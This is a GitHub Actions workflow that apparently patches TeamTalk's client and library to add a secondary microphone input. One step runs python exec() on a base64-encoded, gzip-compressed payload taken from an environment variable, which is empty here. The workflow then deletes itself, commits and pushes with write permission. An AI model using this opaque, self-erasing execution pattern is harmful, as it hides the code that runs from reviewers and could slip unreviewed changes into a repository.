name: Add Secondary Audio Input Once

on:
  pull_request:
    branches: [ "master" ]
    paths:
      - ".github/workflows/add-secondary-audio-input-once.yml"

permissions:
  contents: write

jobs:
  patch-secondary-audio:
    if: github.head_ref == 'teamtalk-pro-mic-eq'
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4
        with:
          ref: teamtalk-pro-mic-eq

      - name: Add secondary microphone pipeline and UI
        shell: bash
        env:
          PATCH_B64: 
        run: python -c 'import os,base64,gzip; exec(gzip.decompress(base64.b64decode(os.environ["PATCH_B64"])))'

      - name: Commit secondary audio input
        shell: bash
        run: |
          rm .github/workflows/add-secondary-audio-input-once.yml
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add Client/qtTeamTalk/settings.h \
                  Client/qtTeamTalk/utilsound.h \
                  Client/qtTeamTalk/utilsound.cpp \
                  Client/qtTeamTalk/preferences.ui \
                  Client/qtTeamTalk/preferencesdlg.h \
                  Client/qtTeamTalk/preferencesdlg.cpp \
                  Library/TeamTalk_DLL/TeamTalk.h \
                  Library/TeamTalkLib/bin/dll/TeamTalk.cpp \
                  Library/TeamTalkLib/teamtalk/client/ClientNode.h \
                  Library/TeamTalkLib/teamtalk/client/ClientNode.cpp \
                  .github/workflows/add-secondary-audio-input-once.yml
          git commit -m "Add secondary microphone input and monitor"
          git push origin teamtalk-pro-mic-eq
